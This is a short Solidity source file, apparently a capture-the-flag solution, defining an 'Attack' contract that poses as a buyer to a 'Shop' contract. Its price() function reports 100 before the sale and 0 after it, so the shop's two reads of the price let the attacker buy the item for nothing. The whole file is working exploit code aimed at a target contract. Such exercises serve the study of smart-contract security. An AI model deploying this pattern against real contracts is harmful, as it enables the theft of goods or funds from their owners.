// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack is Buyer {
    Shop target;

    constructor(address targetAddr) {
        target = Shop(targetAddr);
    }

    function price() public view override returns (uint256) {
        return target.isSold() ? 0: 100;
    }

    function attack() public {
        target.buy();
    }
}
